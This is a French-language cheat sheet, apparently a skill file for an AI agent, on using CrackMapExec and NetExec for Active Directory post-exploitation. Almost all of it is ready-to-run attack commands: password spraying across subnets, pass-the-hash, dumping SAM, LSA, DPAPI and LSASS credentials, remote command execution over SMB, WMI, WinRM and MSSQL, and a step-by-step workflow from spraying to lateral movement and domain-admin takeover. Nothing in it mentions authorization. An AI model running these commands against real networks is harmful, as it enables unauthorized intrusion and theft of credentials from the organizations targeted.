---
name: crackmapexec-netexec
description: CrackMapExec (CME) et NetExec (NXC) — post-exploitation AD, exécution de commandes, pass-the-hash, énumération SMB/WinRM/LDAP/SSH/MSSQL, spraying de mots de passe, extraction SAM/LSA/DPAPI, et modules avancés.
---

# CrackMapExec & NetExec — Post-Exploitation AD

## Présentation

CrackMapExec (CME) est un outil de post-exploitation AD. NetExec (NXC) est son fork moderne (Python 3) avec plus de protocoles.

**Installation :**
```bash
# CrackMapExec
sudo apt install crackmapexec

# NetExec (recommended — plus récent)
pipx install git+https://github.com/Pennyw0rth/NetExec

# Ou
pip3 install netexec
```

---

## Syntaxe commune

```bash
# CrackMapExec
crackmapexec <protocole> <cible> -u <user> -p <pass>

# NetExec (identique mais plus de fonctionnalités)
netexec <protocole> <cible> -u <user> -p <pass>

# Les deux outils sont interchangeables
# Dans ce guide : crackmapexec (CME) / netexec (NXC)
```

---

## Protocoles supportés

### SMB
```bash
# Énumération de base
crackmapexec smb 192.168.1.10 -u admin -p 'Password123'

# Avec hash (pass-the-hash)
crackmapexec smb 192.168.1.10 -u admin -H NTHASH

# Liste des modules
crackmapexec smb -L

# Aide d'un module
crackmapexec smb -M sam --help
```

### WinRM
```bash
crackmapexec winrm 192.168.1.10 -u admin -p 'Password123'
crackmapexec winrm 192.168.1.10 -u admin -H NTHASH
```

### LDAP
```bash
crackmapexec ldap 192.168.1.10 -u admin -p 'Password123'
```

### SSH
```bash
# Énumération via SSH
crackmapexec ssh 192.168.1.10 -u root -p 'Password123'
```

### MSSQL
```bash
crackmapexec mssql 192.168.1.10 -u sa -p 'Password123'
```

---

## Modules SMB — Énumération

### SAM dump
```bash
# Dump du registre SAM (hashs locaux)
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --sam
crackmapexec smb 192.168.1.10 -u admin -H NTHASH --sam

# Format de sortie :
# [+] DOMAIN\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### LSA secrets
```bash
# Dump des secrets LSA (mots de passe stockés, clés de services)
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --lsa
```

### DPAPI
```bash
# Dump des clés DPAPI
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --dpapi
```

### Énumération des partages
```bash
# Lister les partages SMB
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --shares
```

### Sessions actives
```bash
# Voir les sessions actives des utilisateurs
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --sessions
```

### Disques
```bash
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --disks
```

---

## Modules SMB — Exécution

### Execution via SMB (PsExec-like)
```bash
# Commande
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -x whoami
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -x 'ipconfig /all'
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -x 'net user /domain'

# PowerShell
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -X whoami
```

### Execution via WMI
```bash
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -x whoami --exec-method wmiexec
```

### Execution via atexec (scheduled task)
```bash
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -x whoami --exec-method atexec
```

---

## Password Spraying

### Spraying sur SMB
```bash
# Essayer un seul mot de passe pour beaucoup d'utilisateurs
crackmapexec smb 192.168.1.10 -u users.txt -p 'Spring2024!'
crackmapexec smb 192.168.1.10 -u users.txt -p 'Password123'

# Avec continue-on-success (ne pas s'arrêter au premier succès)
crackmapexec smb 192.168.1.10 -u users.txt -p 'Password123' --continue-on-success
```

### Spraying avec hash
```bash
crackmapexec smb 192.168.1.10 -u users.txt -H NTHASH
```

### Spraying multi-cibles
```bash
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --continue-on-success
```

### Spraying multi-protocoles
```bash
# Tester le même mot de passe sur SMB, WinRM, LDAP
for proto in smb winrm ldap; do
    crackmapexec $proto 192.168.1.10 -u users.txt -p 'Password123'
done
```

### Rate limiting (éviter de bloquer les comptes)
```bash
# Attendre entre les tentatives
crackmapexec smb 192.168.1.10 -u users.txt -p 'Password123' --delay 5
```

---

## Cible multiple et plages

### Plages d'IPs
```bash
# CIDR
crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123'

# Plage
crackmapexec smb 192.168.1.10-20 -u admin -p 'Password123'

# Fichier de cibles
crackmapexec smb targets.txt -u admin -p 'Password123'
```

### Exclusion
```bash
crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123' --exclude 192.168.1.1,192.168.1.254
```

---

## Modules avancés

### Lister les modules
```bash
crackmapexec smb -L
crackmapexec ldap -L
```

### Module : spider_plus
```bash
# Parcourir les partages SMB et lister les fichiers
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' \
    -M spider_plus -o DOWNLOAD=true OUTPUT_FOLDER=/tmp/cme_output

# Sans télécharger
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' \
    -M spider_plus -o READ_ONLY=true

# Recherche de fichiers sensibles
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' \
    -M spider_plus -o PATTERN='xls,xlsx,doc,docx,pdf,kdbx'
```

### Module : lsassy
```bash
# Extraction de credentials depuis lsass (comme Mimikatz)
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -M lsassy
```

### Module : handlekatz
```bash
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -M handlekatz
```

### Module : nanodump
```bash
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -M nanodump
```

### Module : slinky
```bash
# Créer un lien symbolique vers un partage
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -M slinky -o NAME=exploit SHARE=C$
```

### Module : uac
```bash
# Vérifier l'état UAC sur les machines
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -M uac
```

### Module : wmi
```bash
# Exécution via WMI (module dédié)
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -M wmi -o COMMAND=whoami
```

---

## LDAP modules

```bash
# Énumération des utilisateurs
crackmapexec ldap 192.168.1.10 -u admin -p 'Password123' --users

# Énumération des groupes
crackmapexec ldap 192.168.1.10 -u admin -p 'Password123' --groups

# Objets de confiance
crackmapexec ldap 192.168.1.10 -u admin -p 'Password123' --trusts

# Politique de mot de passe
crackmapexec ldap 192.168.1.10 -u admin -p 'Password123' --password-policy

# Admin count / admin SDHolder
crackmapexec ldap 192.168.1.10 -u admin -p 'Password123' --admin-count

# Requête personnalisée
crackmapexec ldap 192.168.1.10 -u admin -p 'Password123' \
    --query "(objectCategory=computer)" --attributes dNSHostName,operatingSystem
```

---

## MSSQL modules

```bash
# Exécution de requêtes SQL
crackmapexec mssql 192.168.1.10 -u sa -p 'Password123' -q 'SELECT @@version'

# Exécution de commandes (xp_cmdshell)
crackmapexec mssql 192.168.1.10 -u sa -p 'Password123' -x whoami

# Énumération
crackmapexec mssql 192.168.1.10 -u sa -p 'Password123' --linked-servers
```

---

## WinRM modules

```bash
# Connexion WinRM simple
crackmapexec winrm 192.168.1.10 -u admin -p 'Password123'

# Exécution de commande
crackmapexec winrm 192.168.1.10 -u admin -p 'Password123' -x whoami
```

---

## Workflow typique d'attaque

### 1. Password Spraying
```bash
# Identifier un mot de passe commun
crackmapexec smb 192.168.1.10 -u users.txt -p 'Winter2024!'

# Si succès → utilisateur:admin ou utilisateur:normal trouvé
```

### 2. Énumération du poste compromis
```bash
# Partages
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --shares

# Sessions
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --sessions

# Dump SAM
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --sam
```

### 3. Mouvement latéral
```bash
# Password spraying avec le nouveau mot de passe
crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123'

# Avec hash NTLM
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTHASH
```

### 4. Dump des credentials
```bash
# SAM
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --sam

# LSASS (Mimikatz-like)
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -M lsassy

# LSA
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --lsa
```

### 5. Élévation vers DA
```bash
# Chercher des utilisateurs DA avec des sessions sur le poste
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --sessions

# Si un DA est connecté → dump de LSASS pour capturer son hash
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -M lsassy
```

---

## Formatage de sortie

```bash
# Colonnes personnalisées
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --shares \
    --col "hostname,share,remark"

# JSON
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --shares --json

# Fichier de log
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --shares \
    --log cme_output.log
```

---

## CME/NXC vs autres outils

| Outil | Usage | CME/NXC équivalent |
|-------|-------|-------------------|
| PsExec | Exécution commande | `-x` |
| WMIExec | Exécution via WMI | `--exec-method wmiexec` |
| Secretsdump | Dump SAM/LSA | `--sam --lsa` |
| Mimikatz | Dump lsass | `-M lsassy` |
| BloodHound | Collecte AD | `--users --groups` |
| SMBClient | List shares | `--shares` |
| LDAPDomainDump | Dump LDAP | LDAP modules |

---

## Dépannage

| Problème | Solution |
|----------|----------|
| "STATUS_LOGON_FAILURE" | Mauvais credentials |
| "STATUS_ACCESS_DENIED" | Pas admin |
| "STATUS_PASSWORD_EXPIRED" | Mot de passe expiré |
| "STATUS_ACCOUNT_LOCKED" | Compte bloqué |
| "SMB signing required" | SMB Signing requis |
| Connexion lente | Vérifier le réseau |

---

## Antisèche rapide

```bash
# Connexion simple
crackmapexec smb 192.168.1.10 -u admin -p 'Password123'

# Pass-the-Hash
crackmapexec smb 192.168.1.10 -u admin -H NTHASH

# Dump SAM/LSA
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --sam
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --lsa

# Exécution de commande
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -x whoami

# Shares
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --shares

# Sessions
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' --sessions

# Password spraying
crackmapexec smb 192.168.1.10 -u users.txt -p 'Password123' --continue-on-success

# Spider (recherche fichiers)
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -M spider_plus

# Dump LSASS (module)
crackmapexec smb 192.168.1.10 -u admin -p 'Password123' -M lsassy

# LDAP users
crackmapexec ldap 192.168.1.10 -u admin -p 'Password123' --users

# LDAP password policy
crackmapexec ldap 192.168.1.10 -u admin -p 'Password123' --password-policy

# WinRM
crackmapexec winrm 192.168.1.10 -u admin -p 'Password123'
```